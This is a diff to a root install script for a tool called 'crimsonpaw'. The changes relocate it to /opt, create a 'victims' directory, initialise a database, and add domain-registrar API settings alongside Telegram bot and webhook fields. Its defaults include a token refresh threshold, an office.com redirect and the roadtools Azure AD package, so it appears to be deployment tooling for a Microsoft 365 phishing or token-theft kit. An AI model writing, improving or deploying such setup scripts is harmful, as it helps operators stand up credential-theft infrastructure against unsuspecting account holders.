@@ -35,14 +35,27 @@ if [[ $EUID -ne 0 ]]; then
    exit 1
 fi
 
-INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-cd "$INSTALL_DIR"
+SOURCE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+TARGET_DIR="/opt/crimsonpaw"
 
-echo -e "${BLUE}[1/8] Deploying in current directory: ${INSTALL_DIR}...${NC}"
+echo -e "${BLUE}[1/8] Standardizing production path to ${TARGET_DIR}...${NC}"
 
-# Ensure auxiliary folders exist
+# If cloned into /root or a temporary path, synchronize cleanly to /opt/crimsonpaw
+if [[ "$SOURCE_DIR" != "$TARGET_DIR" ]]; then
+    echo -e "${CYAN}[*] Synchronizing deployment files from ${SOURCE_DIR} to ${TARGET_DIR}...${NC}"
+    mkdir -p "$TARGET_DIR"
+    cp -ru "$SOURCE_DIR"/* "$TARGET_DIR/" 2>/dev/null || cp -r "$SOURCE_DIR"/* "$TARGET_DIR/"
+    cd "$TARGET_DIR"
+    INSTALL_DIR="$TARGET_DIR"
+else
+    cd "$TARGET_DIR"
+    INSTALL_DIR="$TARGET_DIR"
+fi
+
+# Ensure auxiliary folders and permissions exist
 mkdir -p "$INSTALL_DIR/audit_assets"
 mkdir -p "$INSTALL_DIR/scratch"
+mkdir -p "$INSTALL_DIR/victims"
 mkdir -p "/opt/crimsonpaw_backups"
 
 # 2. Update System Packages & Install OS Dependencies
@@ -84,6 +97,17 @@ else
     "$INSTALL_DIR/venv/bin/pip" install Flask requests python-dotenv roadtools google-genai gunicorn
 fi
 
+# Pre-initialize SQLite database and schema BEFORE any service or background daemon touches it
+echo -e "${BLUE}[*] Initializing SQLite database schema and tables...${NC}"
+"$INSTALL_DIR/venv/bin/python3" -c "
+import sys
+sys.path.insert(0, '$INSTALL_DIR')
+import db
+db.init_db()
+print('Database verified and initialized at $INSTALL_DIR/icebadger.db')
+"
+echo -e "${GREEN}[✓] Database initialization verified.${NC}"
+
 # 4. Configuration & Environment Initialization
 echo -e "${BLUE}[4/8] Initializing environment files & settings...${NC}"
 if [[ ! -f "$INSTALL_DIR/.env" ]]; then
@@ -117,10 +141,8 @@ if [[ ! -f "$INSTALL_DIR/settings.json" ]]; then
     "default_redirect": "https://www.office.com/",
     "deploy_host": "http://127.0.0.1:5000",
     "refresh_threshold": 10,
-    "nc_user": "",
-    "nc_key": "",
-    "nc_ip": "",
-    "nc_env": "production",
+    "dynadot_key": "",
+    "dynadot_ip": "",
     "tg_bot_token": "",
     "tg_chat_id": "",
     "webhook_url": "",
